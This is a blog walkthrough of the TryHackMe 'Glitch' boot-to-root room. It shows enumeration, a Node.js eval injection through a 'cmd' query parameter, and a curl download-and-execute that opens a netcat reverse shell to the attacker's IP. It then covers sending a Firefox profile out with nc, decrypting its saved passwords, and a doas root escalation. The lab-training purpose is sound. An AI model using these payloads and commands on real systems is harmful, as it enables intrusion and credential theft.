---
layout: post
title: TryHackMe Walkthrough - GLITCH
date: 2021-05-14
type: post
tags:
- Walkthrough
- Hacking
- TryHackMe
- Boot2Root
- Easy
permalink: /2021/05/TryHackMe-Walkthrough-Glitch/
img: 2021/05/Glitch/glitch.gif
---

This is how I solved the [Glitch TryHackMe room](https://tryhackme.com/room/glitch). It's a easy room with a vulnerable web application written in NodeJs and some simple privilege escalaciton. 
* Room: Glitch
* Difficulty: Easy
* URL: https://tryhackme.com/room/glitch

## Enumeration

The room description makes it clear that there is a web application to exploit. But I still scan the machine for open ports. There could be other things to help. Or the web application could be on a non standard port. I connected to the VPN and launched nmap. 

```bash
$ nmap -A target | tee nmap.txt
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-19 06:26 EDT
Nmap scan report for target (10.10.90.0)
Host is up (0.24s latency).
Not shown: 999 filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: not allowed
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.03 seconds
```

There is only the HTTP port (80) open. I then used GoBuster to look for hidden folder on the site. It found a `/secret/` folder, but it did not contain anything interesting. 

```bash
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://target/
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
2021/05/17 18:37:03 Starting gobuster in directory enumeration mode
===============================================================

http://target/img                  (Status: 301) [Size: 173] [--> /img/]
http://target/js                   (Status: 301) [Size: 171] [--> /js/] 
http://target/secret               (Status: 200) [Size: 724]            
===============================================================
2021/05/17 18:37:40 Finished
===============================================================
```

## Vulnerable Web application

I then launched Burp and Firefox to look at the web site. 

![Initial Site](/assets/images/2021/05/Glitch/01-WebSite.png)

The site does not have much. Just an image without any text. 

But the source shows a JavaScript function that make an API call and output the result to the console. 

```javascript
<script>
  function getAccess() {
	fetch('/api/access')
	  .then((response) => response.json())
	  .then((response) => {
		console.log(response);
	  });
  }
</script>
```

The function is not called, so I used the Firefox console to execute the function and see the result.

![getAccess](/assets/images/2021/05/Glitch/02-GetAccess.png)

It returns a base64 encoded token.

```bash
$ echo -n dGhpc19pc19ub3RfcmVhbA== | base64 -d
this_is_not_real
```

The decoded token is the answer to a question in THM. 

Looking at the HTTP traffic in Burp, I saw that the page was setting a 'token' cookie to 'value'. 

```html
HTTP/1.1 200 OK
Server: nginx/1.14.0 (Ubuntu)
Date: Wed, 19 May 2021 10:32:34 GMT
Content-Type: text/html; charset=utf-8
Connection: close
X-Powered-By: Express
Set-Cookie: token=value; Path=/
```

I used the Firefox Developer Tools to replace the value with the token and refreshed the page.  It gave me a different page. 

![Sad](/assets/images/2021/05/Glitch/03-Sad.png)

The page also makes an API call. This one to `/api/items`. It returns a JSON object that is used to display boxes in the page.

```json
{
  "sins": [
    "lust",
    "gluttony",
    "greed",
    "sloth",
    "wrath",
    "envy",
    "pride"
  ],
  "errors": [
    "error",
    "error",
    "error",
    "error",
    "error",
    "error",
    "error",
    "error",
    "error"
  ],
  "deaths": [
    "death"
  ]
}
```

I couldn't find how to use this to exploit the machine since it only returns text to display text and boxes in categories on the page. 

The hint for the user's flag ask what other methods the API accepts. So I sent the API request to Burp repeater and Issued an OPTIONS request.

```html
HTTP/1.1 200 OK
Server: nginx/1.14.0 (Ubuntu)
Date: Tue, 18 May 2021 10:30:26 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 13
Connection: close
X-Powered-By: Express
Allow: GET,HEAD,POST
ETag: W/"d-bMedpZYGrVt1nR4x+qdNZ2GqyRo"

GET,HEAD,POST
```

The API accepts GET, HEAD, and POST requests. HEAD is not very interesting. But If you send a POST to that API, you will get a different payload. 

```json
{
  "message":"there_is_a_glitch_in_the_matrix"
}
```

I tried using that as the token cookie but it did not work. Then I used Burp repeater to try to find different payloads. I mostly try sending a command using either a `command` or `cmd` argument in the request body, either as json or form data. Nothing worked. 

But when I used `cmd` as a query parameter, I finally got a very different result. 

![Eval](/assets/images/2021/05/Glitch/04-Eval.png)

This is very interesting. It looks like the code is trying to eval the command I'm passing it. So I can use this to run any JS code I want, and probably open a reverse shell. 

I found some examples of [Node reverse shell online](https://riyazwalikar.wordpress.com/2016/08/23/nodejs-rce-and-a-simple-reverse-shell/), but I could not get them to work. The API would return a message saying the vulnerability was exploited, but I would not get the reverse shell. I was able to use nc to connect back to my machine, but not using sh. 

In the end I created a file with a bash reverse shell. 

```bash
$ cat rev.sh 
mkfifo /tmp/kirxhbg; nc 10.13.3.36 4444 0</tmp/kirxhbg | /bin/sh >/tmp/kirxhbg 2>&1; rm /tmp/kirxhbg
```

And started a web server in my Kali box.
```bash
$ sudo python3 -m http.server 80
[sudo] password for ehogue: 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Then I use the vulnerability to execute two commands on the server: download the file and execute it.

```
# Download the file
POST /api/items?cmd=require(%22child_process%22).exec(%22curl%2010.13.3.36/rev.sh%20%3E%20/tmp/rev.sh%22)

# Execute it to open the reverse shell
POST /api/items?cmd=require(%22child_process%22).exec(%22/bin/sh%20/tmp/rev.sh%22) HTTP/1.1
```

I finally got my reverse shell, and the user flag.

```bash
$ nc -klvnp 4444
Listening on 0.0.0.0 4444
Connection received on 10.10.70.208 57468

whoami
user

ls /home/user
user.txt

cat /home/user/user.txt
THM{USER_FLAG}
```

## Lateral Movement
Now that I was logged on the machine, the first thing I did was to solidify my shell. 

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

Hit CTRL-z to send the connection to the background. They foreground it again.
```bash
stty raw -echo;fg
```

Then I started looking around the machine. I saw that there was a `.firefox` folder in the user's home directory. Those often contains passwords that can be extracted with [Firefox Decrypt](https://github.com/Unode/firefox_decrypt).

I compressed the folder and downloaded it to my machine using [netcat](https://nakkaya.com/2009/04/15/using-netcat-for-file-transfers/).

On the receiving machine run this command to wait for the connection and save the data to a file.
```bash
nc -l -p 1234 > ffProfile.tar.gz
```

On the sending machine, open the connection and send the file.
```bash
nc -w 3 10.13.3.36 1234 < ffProfile.tar.gz 
```

Then I used Firefox Decrypt to extract the password from the Firefox profile after decompressing it.
```bash
$ python firefox_decrypt.py .firefox/b5w4643p.default-release/
2021-05-18 11:04:55,237 - WARNING - profile.ini not found in .firefox/b5w4643p.default-release/
2021-05-18 11:04:55,237 - WARNING - Continuing and assuming '.firefox/b5w4643p.default-release/' is a profile location

Master Password for profile .firefox/b5w4643p.default-release/: 
2021-05-18 11:04:58,388 - WARNING - Attempting decryption with no Master Password

Website:   https://glitch.thm
Username: 'v0id'
Password: 'V0ID_PASSWORD'
```

I then used that password to change to the v0id user.

```bash
$ su v0id
Password: 

v0id@ubuntu:/home/user$ whoami
v0id
```

## Escalate to root

The v0id user cannot run sudo and has no crontab. I searched for files with suid permissions. 

```bash
v0id@ubuntu:~$ find / -perm /u=s 2>/dev/null
...
/usr/local/bin/doas


/usr/local/bin/doas
usage: doas [-nSs] [-a style] [-C config] [-u user] command [args]
```

That [`doas`](https://wiki.gentoo.org/wiki/Doas) command looks interesting. It looks like I can use it to run a command as another user. Similar to what sudo does.  I can run using v0id password. 

```bash
v0id@ubuntu:~$ /usr/local/bin/doas -uroot ls
Password: 
```

So I used it to launch `/bin/bash` as root. I could then print the root flag and finish the room.

```bash
v0id@ubuntu:~$ /usr/local/bin/doas -uroot /bin/bash -p
Password: 

root@ubuntu:/home/v0id# whoami
root

root@ubuntu:/home/v0id# cat /root/root.txt 
THM{ROOT_FLAG}
```

